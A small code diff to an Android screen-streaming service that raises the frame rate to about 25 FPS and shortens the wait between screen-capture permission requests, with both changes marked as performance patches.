@@ -35,7 +35,7 @@ public class ScreenStreamService extends Service {
     private static final String TAG = "ScreenStream";
     private static final String CH_ID = "kryptos_screen";
     private static final int NOTIF_ID = 4711;
-    private static final long MIN_FRAME_GAP_MS = 45L;
+    private static final long MIN_FRAME_GAP_MS = 40L; // [KRYPTOS-PATCH PERF] ~25 FPS
 
     private static volatile boolean active = false;
     private static volatile long lastRequest = 0L;
@@ -53,7 +53,7 @@ public class ScreenStreamService extends Service {
     public static void ensure(Context ctx) {
         if (active) return;
         long now = System.currentTimeMillis();
-        if (now - lastRequest < 20000L) return;
+        if (now - lastRequest < 12000L) return; // [KRYPTOS-PATCH PERF]
         lastRequest = now;
         MediaProjectionRequestActivity.launch(ctx);
     }
